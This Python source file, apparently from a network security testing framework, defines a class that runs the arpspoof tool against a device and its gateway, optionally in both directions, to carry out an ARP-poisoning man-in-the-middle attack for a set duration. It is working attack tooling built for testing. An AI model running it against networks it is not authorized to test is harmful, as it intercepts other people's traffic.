from __future__ import annotations

import subprocess
import time

from typing import TYPE_CHECKING

from capex.exceptions import AttackExecutionError

if TYPE_CHECKING:
    from capex.models import ArpSpoofAttackConfig, DeviceConfig
    from capex.runner import CommandRunner

_START_CHECK_DELAY_SECONDS = 0.3
_STOP_TIMEOUT_SECONDS = 10
_KILL_TIMEOUT_SECONDS = 5


class ArpSpoofExecutor:
    """Runs real arpspoof against a device for a bounded duration, then stops it.

    Poisons the device's ARP cache for its relationship with gateway_ip
    (classic on-path MITM), mirroring TcpdumpCapture's popen/terminate/kill
    start-stop pattern since arpspoof itself runs until killed. When
    bidirectional is set, also runs a second arpspoof poisoning the
    gateway's cache entry for the device, so return traffic is redirected
    too - real dsniff-based MITM setups need both directions to actually
    intercept traffic; single-direction poisoning alone often doesn't.
    """

    def __init__(self, *, runner: CommandRunner, attack: ArpSpoofAttackConfig) -> None:
        self._runner = runner
        self._attack = attack

    def execute(self, *, device: DeviceConfig) -> str | None:
        host = str(device.ip)
        processes = [self._start(target_ip=host, impersonate_ip=self._attack.gateway_ip)]

        try:
            if self._attack.bidirectional:
                processes.append(self._start(target_ip=self._attack.gateway_ip, impersonate_ip=host))
        except AttackExecutionError:
            for process in processes:
                self._stop(process)
            raise

        time.sleep(self._attack.duration_seconds)

        for process in processes:
            self._stop(process)

        detail = f'duration_seconds={self._attack.duration_seconds}'
        if self._attack.bidirectional:
            detail += ', bidirectional=true'
        return detail

    def _start(self, *, target_ip: str, impersonate_ip: str) -> subprocess.Popen[str]:
        process = self._runner.popen([
            self._attack.arpspoof_binary,
            '-i',
            self._attack.interface,
            '-t',
            target_ip,
            impersonate_ip,
        ])

        time.sleep(_START_CHECK_DELAY_SECONDS)

        if process.poll() is not None:
            _, stderr = process.communicate()
            msg = f'{self._attack.arpspoof_binary} exited immediately with code {process.returncode}: {stderr.strip()}'
            raise AttackExecutionError(msg)

        return process

    def _stop(self, process: subprocess.Popen[str]) -> None:
        process.terminate()
        try:
            process.wait(timeout=_STOP_TIMEOUT_SECONDS)
        except subprocess.TimeoutExpired:
            process.kill()
            process.wait(timeout=_KILL_TIMEOUT_SECONDS)
